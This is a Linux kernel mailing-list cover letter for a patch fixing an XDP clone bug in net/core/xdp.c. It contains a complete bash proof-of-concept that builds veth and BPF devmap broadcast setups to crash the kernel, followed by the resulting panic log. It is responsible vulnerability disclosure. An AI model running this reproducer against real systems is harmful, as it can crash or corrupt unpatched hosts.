Received: from mail-qk2-f2.google.com (mail-qk2-f2.google.com [74.125.230.194])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2981C4052DB
	for <bpf@vger.kernel.org>; Mon,  3 Aug 2026 12:16:02 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.230.194
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785759369; cv=none; b=uWZRIYlZWJFRvVq5t4aHwN42TWWnrYh02/4eDMxSVVCjLvxrTBNi8NQNCReqs1dtF1k2M/3KFW+fSfTlIccWiM3c+qdZr1OweXRr1xjAmXkymtSQLQ8fgQsNBR3QNh19ia2h//sA5W+CGstagdkZnGND06vEg2qevvMX9PJg/kc=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785759369; c=relaxed/simple;
	bh=9G+SAIvTb/Bw7qn5lPJvCykiZ5KAwSmrLyQUQ3kyryw=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=drW7M9t22+M+Xshh8c8AJ6F7JQWW8sKsBHUku3kKa0+NCr/IoG/y6wMmQLdAHyQhEtoAITlmCQuqLSKntN+X277aT0Eq1z8hAEsyP6sbKx/SStCqPeN7G73oYhHevhliYukUeM5oAgoZzSgXBZ6gxk8V92nigh0Xv9LOgWEaI7A=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=uRWaHCMA; arc=none smtp.client-ip=74.125.230.194
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="uRWaHCMA"
Received: by mail-qk2-f2.google.com with SMTP id d75a77b69052e-51ca0db8779so3240001cf.1
        for <bpf@vger.kernel.org>; Mon, 03 Aug 2026 05:16:02 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785759362; x=1786364162; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=LhKIOfQvk4ADbl9tsAvwQU/ZRdUyv5ZIVNeBhIR/bMY=;
        b=uRWaHCMAzQDSsV+uJnIkPnc/7WhPqd11NIXdVFjt5jwMZk0Oh5ah3y0JRlsYiHgKSE
         waNwvG7uPMK+pa4dIhtY7q7E2gn93cLEwJVVSBWtQeXCzWvVfat1orLxy8/cD2pq6rCW
         g/sRXMdOQ1DeEH661t5JIsgXnjYma2+HzO5K4X6+Z4nsUIG0mUYdv9crfLkAidCa2uj5
         pSZzVhj3vYf3Fnsma4xUdTfP2SljCiRq4A3GfWvD5GqEpV8Xt55LDKrTphyIA7aI2PUn
         w1e+NLb5fSbOWOpsRoyH/7bg5ClGxyZIxQfhW3l+ToJZDspWAixUa7z2+/KWAAWhkZxu
         MiVA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785759362; x=1786364162;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=LhKIOfQvk4ADbl9tsAvwQU/ZRdUyv5ZIVNeBhIR/bMY=;
        b=Yp4N5yqhlrsK4DqkKeTUEoNUJrkitAZ98McEKC18HRCagl9XnQCAFbCYM7rmnsmTag
         Sn3RmfOkt6LgqGyzpguAUGY7nLpiguip+p/FeRriGCBsQ7mqYJTEeu1v5Mk3oYF5jMoZ
         ahiY8SGUg9rIzIsFdEj4f1dU6XjAWs3K53r3FMQjRFQ2lE60F2GKGibrAITAhVy/7axQ
         3jwG6pjyjcN+ykTzwlYPfOqCps2fuQiPk2fxnxzfWuTR+APTpqCD8fE/9YinLHtiqvVF
         +bXnQeY8QIZwivpJrWTV2AoEw8KwZmr5J3kxkw6Qh4mrPVoG5tJq9WWr2ZX2z0P9E3wX
         ja5w==
X-Forwarded-Encrypted: i=1; AHgh+Rp4jhumI9xn16Qmycf5X3fWopJi4NMHqyp/AnfrlLFRNPy+2gOXCQxbzPOKPefl/uSmWdM=@vger.kernel.org
X-Gm-Message-State: AOJu0Yz7wjKBks7+ltSi8eVs756njR29F0bX/UMTYIoZRKRy5sPx73CC
	f5eVhqiq8Uk12KF5zfljc6cABwcv10N7u9b/LKivFI8mrOfqzywx5wKUINafWCrdGwjs
X-Gm-Gg: AR+sD13YKQyRzscJnKEQl3Idf7Pd/Sp2GplP5fVKiS5GbDI14Oscsw5/ExALHsnEj0H
	zcYypCilJoAln3G76/EZkfHnSn7cmiW6RoPOa+10wxkcJo4QgS3Trp6puKwMWHonfRK41kvkEz/
	cd+6t+2+4aPrMCJf4CMgTNzY6xz1hQEwnEfYVE+8KVgdFAvf+HnMazNH9gdBnF8xw5x6hRZANPC
	iYaonnVULm6VuBxm29ppJ+VRgZrdkGHZlD295Bp9Sb9E/d/qUhIHPWqT79fhJA9O1+KGH5XFieW
	1oOI6lWkrPv42XxIAVAQAQiowFPm6f/YKdrY+YnVvIVtA9Mkdmk0eTMfWxFM31ja31P4TP5r9nH
	jttELbLa+KnlKailNQwjGHsTLMsC1/0bFgGDOAP+ZaRJBh6ma1QDpGCq/WNl0lpECrYqntrn5M3
	M4yro0fejk0bNhfU1qsjqvp96ZhfdTLHGyxLe0KO0NvnCCrOepwItDP8ZhcyEsLZzB/yJ2ArcCl
	L78
X-Received: by 2002:a05:622a:1e0f:b0:51c:21d1:3852 with SMTP id d75a77b69052e-52b5676001fmr200996121cf.5.1785759356716;
        Mon, 03 Aug 2026 05:15:56 -0700 (PDT)
Received: from Roxy.localdomain ([203.175.14.32])
        by smtp.gmail.com with ESMTPSA id d75a77b69052e-52b4e7ee1b7sm59323971cf.5.2026.08.03.05.15.50
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 03 Aug 2026 05:15:55 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: netdev@vger.kernel.org,
	bpf@vger.kernel.org
Cc: ast@kernel.org,
	daniel@iogearbox.net,
	davem@davemloft.net,
	kuba@kernel.org,
	hawk@kernel.org,
	john.fastabend@gmail.com,
	sdf@fomichev.me,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	liuhangbin@gmail.com,
	kafai@fb.com,
	toke@redhat.com,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net 0/1] xdp: reject clones that overrun skb_shared_info tailroom
Date: Mon,  3 Aug 2026 20:15:31 +0800
Message-ID: <cover.1785757386.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/core/xdp.c. The bug was reproduced as
root in the initial namespace through XDP devmap broadcast cloning.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

xdpf_clone() clones broadcast copies into a single page and sets the cloned
frame size to PAGE_SIZE.

That is not sufficient for frames that can later reach
__xdp_build_skb_from_frame(). The skb build path expects
SKB_DATA_ALIGN(sizeof(struct skb_shared_info)) bytes of tailroom at the end of
the backing buffer, and it computes shared-info placement from frame_sz.

The current check only rejects clones when the copied xdp_frame header,
headroom, and packet data exceed PAGE_SIZE. A source frame backed by a larger
allocation can satisfy that check while still extending into the clone's
required shared-info area.

When such a clone is redirected to a device that rebuilds an skb from the
cloned frame, build_skb_around() places skb_shared_info over live packet bytes.
Subsequent packet writes can corrupt shared-info state and later crash in XDP
return and free handling.

The fix is to reject clones unless their linear area fits inside
SKB_WITH_OVERHEAD(PAGE_SIZE), which preserves the required skb_shared_info
tailroom for the clone.

Reproducer:

    chmod +x ./poc.sh
    ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------

#!/bin/bash
set -euo pipefail

DIR=$(cd "$(dirname "$0")" && pwd)
XDP_OBJ=${XDP_OBJ:-"$DIR/xdp_redir.bpf.o"}
TC_OBJ=${TC_OBJ:-"$DIR/tc_clobber.bpf.o"}
LWT_OBJ=${LWT_OBJ:-"$DIR/lwt_headroom.bpf.o"}

SRC_TX=srcveth0
SRC_XDP=srcxdp0
DST0_XDP=dstxdp0
DST0_RX=dstrx0
DST1_XDP=dstxdp1
DST1_RX=dstrx1
FRAME_LEN=${FRAME_LEN:-3800}
UDP_PAYLOAD_LEN=${UDP_PAYLOAD_LEN:-3758}
SRC_MTU=${SRC_MTU:-5000}
DST_MTU=${DST_MTU:-5000}
KEEP=${KEEP:-0}
SRC_IP=${SRC_IP:-192.0.2.1}
DST_IP=${DST_IP:-198.51.100.1}

le32_hex() {
	local v=$1
	printf '%02x %02x %02x %02x' \
		$((v & 0xff)) \
		$(((v >> 8) & 0xff)) \
		$(((v >> 16) & 0xff)) \
		$(((v >> 24) & 0xff))
}

cleanup() {
	set +e
	ip link set dev "$SRC_XDP" xdp off 2>/dev/null || true
	ip route del "$DST_IP"/32 dev "$SRC_TX" 2>/dev/null || true
	tc qdisc del dev "$DST0_RX" clsact 2>/dev/null || true
	ip link del "$SRC_TX" 2>/dev/null || true
	ip link del "$SRC_XDP" 2>/dev/null || true
	ip link del "$DST0_XDP" 2>/dev/null || true
	ip link del "$DST1_XDP" 2>/dev/null || true
}
if [[ "$KEEP" != 1 ]]; then
	trap cleanup EXIT
fi

if [[ ! -f "$XDP_OBJ" || ! -f "$TC_OBJ" || ! -f "$LWT_OBJ" ]]; then
	echo "missing BPF object(s): $XDP_OBJ $TC_OBJ $LWT_OBJ" >&2
	exit 1
fi

cleanup

ip link add "$SRC_TX" type veth peer name "$SRC_XDP"
ip link add "$DST0_XDP" type veth peer name "$DST0_RX"
ip link add "$DST1_XDP" type veth peer name "$DST1_RX"

ip link set dev "$SRC_TX" mtu "$SRC_MTU"
ip link set dev "$SRC_XDP" mtu "$SRC_MTU"
ip link set dev "$DST0_XDP" mtu "$DST_MTU"
ip link set dev "$DST0_RX" mtu "$DST_MTU"
ip link set dev "$DST1_XDP" mtu "$DST_MTU"
ip link set dev "$DST1_RX" mtu "$DST_MTU"

for dev in "$SRC_TX" "$SRC_XDP" "$DST0_XDP" "$DST0_RX" "$DST1_XDP" "$DST1_RX"; do
	ip link set dev "$dev" up
done

ip addr add "$SRC_IP"/24 dev "$SRC_TX"

ethtool -K "$DST0_RX" gro on
ethtool -K "$DST1_RX" gro on

ip link set dev "$SRC_XDP" xdp obj "$XDP_OBJ" sec xdp.frags

prog_id=$(ip -d link show dev "$SRC_XDP" | awk '$1 == "prog/xdp" {for (i = 1; i <= NF; i++) if ($i == "id") { print $(i + 1); exit }}')
map_id=$(bpftool prog show id "$prog_id" | sed -n 's/.*map_ids //p' | awk '{print $1; exit}')
if [[ -z "$map_id" ]]; then
	echo "unable to find tx_ports devmap" >&2
	exit 1
fi

dst0_ifindex=$(cat "/sys/class/net/$DST0_XDP/ifindex")
dst1_ifindex=$(cat "/sys/class/net/$DST1_XDP/ifindex")
src_xdp_mac=$(cat "/sys/class/net/$SRC_XDP/address")

bpftool map update id "$map_id" key hex 00 00 00 00 value hex $(le32_hex "$dst0_ifindex")
bpftool map update id "$map_id" key hex 01 00 00 00 value hex $(le32_hex "$dst1_ifindex")

tc qdisc add dev "$DST0_RX" clsact
tc filter add dev "$DST0_RX" ingress bpf direct-action obj "$TC_OBJ" sec tc

ip neigh replace "$DST_IP" lladdr "$src_xdp_mac" nud permanent dev "$SRC_TX"
ip route replace "$DST_IP"/32 dev "$SRC_TX" encap bpf xmit obj "$LWT_OBJ" sec lwt_xmit headroom 256

python3 - "$SRC_IP" "$DST_IP" "$UDP_PAYLOAD_LEN" <<'PY'
import socket
import sys
import time

src_ip = sys.argv[1]
dst_ip = sys.argv[2]
payload_len = int(sys.argv[3])
payload = bytes((i & 0xff for i in range(payload_len)))

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind((src_ip, 0))
for _ in range(32):
    s.sendto(payload, (dst_ip, 9))
    time.sleep(0.01)
PY

echo "frames sent; dumping post-run state"
tc -s filter show dev "$DST0_RX" ingress || true
bpftool map show | awk '$3 == "name" && $4 == "tc_stats" { gsub(":", "", $1); print $1 }' | while read -r id; do
	echo "tc_stats map $id"
	bpftool map dump id "$id" || true
done
ip -s link show dev "$SRC_XDP" || true
ip -s link show dev "$DST0_RX" || true
ip -s link show dev "$DST1_RX" || true
sleep 1

------END poc.sh--------

----BEGIN crash log----

[  422.057602][    C3] kernel BUG at arch/x86/mm/physaddr.c:28!
[  422.058263][    C3] Oops: invalid opcode: 0000 [#1] PREEMPT SMP KASAN NOPTI
[  422.058762][    C3] CPU: 3 UID: 0 PID: 11020 Comm: python3 Not tainted 6.12.95 #2
[  422.059279][    C3] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  422.060050][    C3] RIP: 0010:__phys_addr+0x7a/0xd0
[  422.060469][    C3] Code: 84 c9 75 28 0f b6 0d a6 09 16 0f 80 f9 3f 0f 87 24 bd 0b 09 48 89 c2 48 d3 ea 48 85 d2 75 0a 48 83 c4 08 5b e9 12 ce 37 09 90 <0f> 0b 48 c7 c7 81 7c 4e 90 48 89 04 24 e8 b4 25 a5 00 48 8b 04 24
[  422.061713][    C3] RSP: 0018:ffffc900002b8a18 EFLAGS: 00010287
[  422.062126][    C3] RAX: aab02aaaaaaaa000 RBX: aaafb32b2aaaa000 RCX: 0000000000000000
[  422.062657][    C3] RDX: 0000000000000000 RSI: 0000000000000001 RDI: aaafb32aaaaaa000
[  422.063179][    C3] RBP: aaafb32aaaaaa000 R08: 0000000000000000 R09: 0000000000000000
[  422.063689][    C3] R10: ffffffff904e92cf R11: ffff88810d88c300 R12: 0000000000000000
[  422.064199][    C3] R13: 0000000000000001 R14: 0000000000000000 R15: ffff88806285f010
[  422.064721][    C3] FS:  00007f3af0987780(0000) GS:ffff888118b80000(0000) knlGS:0000000000000000
[  422.065331][    C3] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  422.065767][    C3] CR2: 000000000050f466 CR3: 00000000210f4000 CR4: 0000000000750ef0
[  422.066347][    C3] PKRU: 55555554
[  422.066586][    C3] Call Trace:
[  422.066810][    C3]  <IRQ>
[  422.066998][    C3]  ? veth_xdp_xmit+0x40f/0xab0
[  422.067397][    C3]  __xdp_return+0x6d/0x8b0
[  422.067730][    C3]  xdp_return_frame_rx_napi+0x1c5/0x2a0
[  422.068094][    C3]  bq_xmit_all+0x35c/0x4f0
[  422.068429][    C3]  __dev_flush+0x80/0x1d0
[  422.068718][    C3]  veth_poll+0x707/0xa10
[  422.068996][    C3]  ? __pfx_veth_poll+0x10/0x10
[  422.069328][    C3]  ? __pfx_sched_clock_cpu+0x10/0x10
[  422.069709][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  422.070132][    C3]  __napi_poll.constprop.0+0xa1/0x440
[  422.070509][    C3]  net_rx_action+0x928/0xe20
[  422.070826][    C3]  ? __pfx_net_rx_action+0x10/0x10
[  422.071153][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  422.071565][    C3]  ? sched_ttwu_pending+0x2f3/0x600
[  422.071941][    C3]  ? __pfx_lock_release+0x10/0x10
[  422.072305][    C3]  handle_softirqs+0x2ae/0x8b0
[  422.072638][    C3]  ? __pfx_handle_softirqs+0x10/0x10
[  422.072986][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  422.073357][    C3]  ? irqtime_account_irq+0x24/0x2e0
[  422.073707][    C3]  ? __dev_queue_xmit+0x897/0x37e0
[  422.074041][    C3]  do_softirq+0xb2/0xf0
[  422.074331][    C3]  </IRQ>
[  422.074526][    C3]  <TASK>
[  422.074720][    C3]  __local_bh_enable_ip+0x101/0x120
[  422.075062][    C3]  ? __dev_queue_xmit+0x897/0x37e0
[  422.075409][    C3]  __dev_queue_xmit+0x8ac/0x37e0
[  422.075740][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  422.076136][    C3]  ? hlock_class+0x4e/0x130
[  422.076449][    C3]  ? __pfx___lock_acquire+0x10/0x10
[  422.076794][    C3]  ? __pfx___dev_queue_xmit+0x10/0x10
[  422.077145][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  422.077510][    C3]  ? find_held_lock+0x2d/0x110
[  422.077844][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  422.078211][    C3]  ? ip_finish_output2+0x6a2/0x1eb0
[  422.078575][    C3]  ? __pfx_lock_release+0x10/0x10
[  422.078911][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  422.079282][    C3]  ? trace_lock_acquire+0x145/0x1c0
[  422.079621][    C3]  ? ip_finish_output2+0x6a2/0x1eb0
[  422.079953][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  422.080322][    C3]  ? __asan_memcpy+0x3c/0x60
[  422.080666][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  422.081035][    C3]  ip_finish_output2+0x6a2/0x1eb0
[  422.081372][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  422.081734][    C3]  ? ip_skb_dst_mtu+0x49b/0x9c0
[  422.082048][    C3]  ? __pfx_ip_skb_dst_mtu+0x10/0x10
[  422.082393][    C3]  ? __pfx_ip_finish_output2+0x10/0x10
[  422.082747][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  422.083112][    C3]  ? __ip_finish_output+0x15d/0x570
[  422.083461][    C3]  ip_output+0x171/0x3b0
[  422.083745][    C3]  ip_send_skb+0x1a2/0x200
[  422.084037][    C3]  udp_send_skb+0x604/0x1980
[  422.084365][    C3]  udp_sendmsg+0x1582/0x2370
[  422.084664][    C3]  ? __pfx_aa_label_sk_perm+0x10/0x10
[  422.085054][    C3]  ? __pfx_ip_generic_getfrag+0x10/0x10
[  422.085450][    C3]  ? __pfx_udp_sendmsg+0x10/0x10
[  422.085781][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  422.086149][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  422.086511][    C3]  ? find_held_lock+0x2d/0x110
[  422.086833][    C3]  ? __pfx_lock_release+0x10/0x10
[  422.087184][    C3]  ? __sys_sendto+0x32e/0x3a0
[  422.087505][    C3]  __sys_sendto+0x32e/0x3a0
[  422.087798][    C3]  ? __pfx___sys_sendto+0x10/0x10
[  422.088127][    C3]  ? reacquire_held_locks+0x20b/0x4c0
[  422.088496][    C3]  ? do_user_addr_fault+0x854/0xe10
[  422.088847][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  422.089230][    C3]  __x64_sys_sendto+0xe0/0x1c0
[  422.089549][    C3]  ? do_syscall_64+0x93/0x270
[  422.089881][    C3]  ? srso_alias_return_thunk+0x5/0xfbef5
[  422.090248][    C3]  ? lockdep_hardirqs_on+0x7b/0x110
[  422.090601][    C3]  do_syscall_64+0xc7/0x270
[  422.090902][    C3]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  422.091303][    C3] RIP: 0033:0x7f3af0a1b687
[  422.091606][    C3] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[  422.092837][    C3] RSP: 002b:00007ffd1b57a720 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[  422.093377][    C3] RAX: ffffffffffffffda RBX: 00007f3af0987780 RCX: 00007f3af0a1b687
[  422.093873][    C3] RDX: 0000000000000eae RSI: 0000000004dd1c90 RDI: 0000000000000003
[  422.094389][    C3] RBP: 0000000000000000 R08: 00007ffd1b57a880 R09: 0000000000000010
[  422.094896][    C3] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000000
[  422.095424][    C3] R13: 0000000000000000 R14: 000000000050f5e6 R15: 0000000000a83590
[  422.095938][    C3]  </TASK>
[  422.096173][    C3] Modules linked in:
[  422.096503][    C3] ---[ end trace 0000000000000000 ]---
[  422.096878][    C3] RIP: 0010:__phys_addr+0x7a/0xd0
[  422.097247][    C3] Code: 84 c9 75 28 0f b6 0d a6 09 16 0f 80 f9 3f 0f 87 24 bd 0b 09 48 89 c2 48 d3 ea 48 85 d2 75 0a 48 83 c4 08 5b e9 12 ce 37 09 90 <0f> 0b 48 c7 c7 81 7c 4e 90 48 89 04 24 e8 b4 25 a5 00 48 8b 04 24
[  422.098544][    C3] RSP: 0018:ffffc900002b8a18 EFLAGS: 00010287
[  422.099014][    C3] RAX: aab02aaaaaaaa000 RBX: aaafb32b2aaaa000 RCX: 0000000000000000
[  422.099725][    C3] RDX: 0000000000000000 RSI: 0000000000000001 RDI: aaafb32aaaaaa000
[  422.100400][    C3] RBP: aaafb32aaaaaa000 R08: 0000000000000000 R09: 0000000000000000
[  422.101080][    C3] R10: ffffffff904e92cf R11: ffff88810d88c300 R12: 0000000000000000
[  422.101610][    C3] R13: 0000000000000001 R14: 0000000000000000 R15: ffff88806285f010
[  422.102117][    C3] FS:  00007f3af0987780(0000) GS:ffff888118b80000(0000) knlGS:0000000000000000
[  422.102705][    C3] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  422.103149][    C3] CR2: 000000000050f466 CR3: 00000000210f4000 CR4: 0000000000750ef0
[  422.103680][    C3] PKRU: 55555554
[  422.103917][    C3] Kernel panic - not syncing: Fatal exception in interrupt
[  422.104762][    C3] Kernel Offset: disabled
[  422.105110][    C3] ---[ end Kernel panic - not syncing: Fatal exception in interrupt ]---

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  xdp: reject clones that overrun skb_shared_info tailroom

 net/core/xdp.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

-- 
2.43.0

